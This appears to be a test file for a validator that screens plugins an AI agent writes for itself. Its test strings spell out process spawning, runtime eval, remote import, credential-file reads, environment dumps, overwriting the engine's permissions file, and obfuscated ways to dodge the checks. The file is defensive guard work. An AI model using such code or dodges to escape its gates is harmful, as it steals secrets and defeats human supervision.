import { test, expect } from "bun:test"
import { slug, pluginFileName, factoryName, scaffoldPlugin, validatePluginSource, validateSpec } from "./selfextend"

test("slug / file / factory naming", () => {
  expect(slug("CSV Tools!")).toBe("csv-tools")
  expect(pluginFileName("CSV Tools")).toBe("fabula-csv-tools.ts")
  expect(factoryName("csv tools")).toBe("FabulaCsvTools")
  expect(factoryName("")).toBe("FabulaCustom")
})

test("scaffold produces a valid one-export plugin", () => {
  const src = scaffoldPlugin({ name: "csv tools", toolName: "csv_rows", toolDescription: "count rows", body: 'return { output: "3 rows" }' })
  expect(src).toContain("export const FabulaCsvTools: Plugin")
  expect(src).toContain("csv_rows: tool(")
  expect(src).toContain('return { output: "3 rows" }')
  // the scaffold satisfies its own contract validator
  expect(validatePluginSource(src).ok).toBe(true)
})

test("validatePluginSource enforces exactly one Fabula* export", () => {
  expect(validatePluginSource("export const FabulaX: Plugin = async () => ({})").ok).toBe(true)
  const two = validatePluginSource("export const FabulaX = 1\nexport const helper = 2")
  expect(two.ok).toBe(false)
  expect(two.errors[0]).toContain("EXACTLY one")
  const wrongName = validatePluginSource("export const myPlugin = async () => ({})")
  expect(wrongName.ok).toBe(false)
  expect(wrongName.errors[0]).toContain("Fabula*")
  expect(validatePluginSource("const x = 1").ok).toBe(false) // no export
})

test("validateSpec catches bad tool names / missing return", () => {
  expect(validateSpec({ name: "x", toolName: "ok_tool", toolDescription: "d", body: "return 'y'" }).ok).toBe(true)
  expect(validateSpec({ name: "x", toolName: "bad name", toolDescription: "d", body: "return 1" }).ok).toBe(false)
  expect(validateSpec({ name: "x", toolName: "t", toolDescription: "d", body: "no ret" }).ok).toBe(false)
})

// ── what a SELF-AUTHORED plugin may not reach for (W6) ────────────────────────────────────────────
// The shape check protects plugin LOADING and says nothing about what the body does. A self-written
// plugin runs with full plugin privileges from the next engine start — ahead of every gate and guard —
// so the write is the only cheap place to refuse.
const wrap = (body: string) => `export const FabulaThing = () => { ${body} }`
const refused = (body: string) => validatePluginSource(wrap(body)).ok === false

test("a self-authored plugin may not spawn processes, in any spelling", () => {
  expect(refused(`const cp = require("child_process"); cp.execSync("id")`)).toBe(true)
  expect(refused(`import { execFile } from "node:child_process"`)).toBe(true)
  expect(refused("Bun.spawnSync(['id'])")).toBe(true)
  expect(refused("Bun.$`id`")).toBe(true) // the idiomatic way here, missed by the first version
})

test("a self-authored plugin may not evaluate code at runtime", () => {
  expect(refused('eval("1+1")')).toBe(true)
  expect(refused('new Function("return 1")()')).toBe(true)
  expect(refused('import("https://example.com/x.js")')).toBe(true)
})

test("the obvious dodges are normalised away rather than chased", () => {
  // Every one of these is a normal thing a TypeScript author would write, and every one walked past the
  // first version of the rules.
  expect(refused('(globalThis as any)["ev" + "al"]("x")')).toBe(true)
  expect(refused('(0, eval)("x")')).toBe(true)
  expect(refused("const F = Function; F('return 1')()")).toBe(true)
  expect(refused('const g = globalThis; g["ev"+"al"]("x")')).toBe(true)
  expect(refused('const p = process; p["e"+"nv"]')).toBe(true)
  expect(refused('(Bun as any)["$"]`id`')).toBe(true)
})

test("a dangerous call is refused whether its argument is a literal or a variable", () => {
  // The normaliser that erases decoration must not erase CALL parentheses with it. An earlier version
  // rewrote `execSync(cmd)` to `execSynccmd`, destroying the word boundary the rules match on, so every
  // one of these passed while the literal-argument spelling of the same call was refused.
  expect(refused('const c = "id"; execSync(c)')).toBe(true)
  expect(refused('const s = "1+1"; eval(s)')).toBe(true)
  expect(refused("new Function(src)()")).toBe(true)
  expect(refused('const a = ["id"]; Bun.spawnSync(a)')).toBe(true)
  expect(refused("const cp = require(mod); cp.execFile(bin)")).toBe(true)
})

test("credential material and the supervision state are refused", () => {
  expect(refused('readFileSync("~/.ssh/id_rsa")')).toBe(true)
  expect(refused('readFileSync(home + "/.aws/credentials")')).toBe(true)
  expect(refused('writeFileSync("~/.config/fabula/fabula-permissions.json", "{}")')).toBe(true)
  expect(refused("Object.keys(process.env)")).toBe(true)
})

test("ordinary plugin work is NOT refused", () => {
  // A deny-list that refuses everything teaches nothing and gets switched off. The first version matched
  // `.env` (so every plugin reading one named variable was refused, with a reason untrue of it) and bare
  // `unlinkSync` (so cleaning up one's own temp file counted as destroying data).
  expect(refused("const url = process.env.FABULA_AUX_URL")).toBe(false)
  expect(refused('unlinkSync("/tmp/my-scratch.json")')).toBe(false)
  expect(refused('const r = await fetch("https://example.com/data.json"); return r.json()')).toBe(false)
  expect(refused('writeFileSync("/tmp/out.txt", "hi")')).toBe(false)
})

test("prose about a capability is not the capability", () => {
  // Comments are explanation, not behaviour; refusing the word taught the author nothing.
  expect(refused("// this plugin never reads credentials or spawns a child_process\nreturn {}")).toBe(false)
})

test("the refusal says what was refused and what to do instead", () => {
  const v = validatePluginSource(wrap('Bun.$`id`'))
  expect(v.ok).toBe(false)
  expect(v.errors.join(" ")).toContain("spawns processes")
  expect(v.errors.join(" ")).toContain("by hand")
})

test("the shape contract still holds alongside the capability rules", () => {
  expect(validatePluginSource("export const FabulaA = () => ({})\nexport const FabulaB = () => ({})").ok).toBe(false)
  expect(validatePluginSource("export const NotFabula = () => ({})").ok).toBe(false)
  expect(validatePluginSource("export const FabulaOk = () => ({})").ok).toBe(true)
})
